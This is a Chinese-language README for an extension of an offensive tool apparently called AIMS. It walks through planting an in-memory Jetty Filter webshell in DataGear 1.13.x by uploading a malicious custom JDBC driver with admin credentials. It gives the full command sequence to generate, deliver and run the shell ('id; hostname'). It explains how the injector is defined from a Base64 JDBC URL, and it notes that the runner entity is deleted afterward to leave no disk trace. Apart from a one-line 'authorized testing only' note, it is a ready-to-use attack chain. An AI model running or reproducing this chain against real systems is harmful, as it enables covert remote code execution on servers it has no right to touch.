# DataGear JDBC delivery example

这是 **扩展示例**，不属于 AIMS 核心。核心只生成 payload；该示例演示一种投递场景：

> 目标使用 DataGear（1.13.x 内嵌 Jetty 8），你拥有管理员权限，可通过"自定义 JDBC 驱动"功能投递。

仅用于已授权测试。

---

## 使用

```bash
# 1) 用核心生成 payload，并写入 target/param/encryptor/shell_url 状态
python3 ../../aims.py gen --server Jetty --version 8.1 --type Filter --tool Command \
  --target https://TARGET --param mysecret --pattern /static/mysecret

# 2) 投递（读取 ~/.aims/state.json）
python3 deliver.py --admin 'admin:密码'
# 或: AIMS_ADMIN='admin:密码' python3 deliver.py

# 3) 执行
python3 ../../aims.py exec 'id; hostname'
python3 ../../aims.py status
```

- `deliver.py` 会自动完成：管理员登录 → 上传 runner 驱动 → 注册驱动实体 → 触发
  `jdbc:party:<Base64(injector)>` → 验证壳 → 删除 runner 实体。
- `--keep-runner` 保留 runner 便于调试；`--runner-id` 指定实体 ID。
- 需要 **Command** 工具与 `DefaultBase64` packer（`aims.py gen` 的默认值）。

---

## 原理

1. DataGear 管理员可上传自定义 JDBC 驱动；
2. runner 类 `party.PartyDriver` 接受 URL：`jdbc:party:<Base64(injector class bytes)>`；
3. `/schema/testConnection` 触发驱动加载/`connect()`：
   - `defineClass(injector)` 并 `newInstance()`；
   - MemShellParty 的 `JettyFilterInjector` 扫描线程上下文找到 `WebAppContext`；
   - 将 shell 类 `defineClass` 进 `WebAppClassLoader` 并注册 Filter。
4. 验证成功后删除 runner 实体；壳只存在于 JVM 内存，重启即消失。

> 这是场景示例，不是通用投递方案；换目标请换用对应的注入点/打包器。

---

## 文件

```
deliver.py                      # 本示例投递脚本
payload/party/PartyDriver.java  # 通用 injector 执行器（JDK 反射，无外部依赖）
payload/party/party.jar         # 预编译（Java 8）
```

重编译：

```bash
cd payload/party
mkdir -p classes
/opt/jdk1.8.0_202/bin/javac -source 1.8 -target 1.8 -d classes PartyDriver.java
/opt/jdk1.8.0_202/bin/jar cf party.jar -C classes .
```

---

## 注意

- 示例依赖 DataGear 的驱动上传接口与 Jetty 8/9；不同版本请用 MemShellParty 生成匹配的 payload。
- runner 只做"定义并实例化 injector"，不包含 shell 逻辑；shell 由 MemShellParty 生成。
- AIMS 核心与 MemShellParty 均为 MIT；见仓库根目录 LICENSE / NOTICE。
